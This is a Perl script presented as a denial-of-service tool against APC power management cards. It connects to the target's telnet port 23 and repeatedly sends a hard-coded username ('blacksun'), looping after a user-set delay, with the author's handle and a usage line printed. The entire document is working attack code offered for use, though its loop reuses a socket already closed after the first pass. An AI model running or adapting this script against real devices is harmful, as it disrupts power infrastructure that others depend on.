#!/usr/bin/perl
#altomo@nudehackers.com
#apc management card dos

$user = "blacksun";
$time = "$ARGV[1]";

use IO::Socket;
$ip = "$ARGV[0]";
$port = "23";
if ($#ARGV<0) {
print " useage: $0 <hostname> <delay in seconds>\n";
exit();
}
$socket = IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>$ip,
PeerPort=>$port,);


print "Apc management card DoS\n";
print "altomo\@nudehackers.com\n";


sub dos() {
print "DoS started will attack every $time seconds\n";
print "Ctrl+C to exit\n";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print "\n";
close $socket;
sleep($time);          
&dos;

}
&dos;
#hong kong danger duo
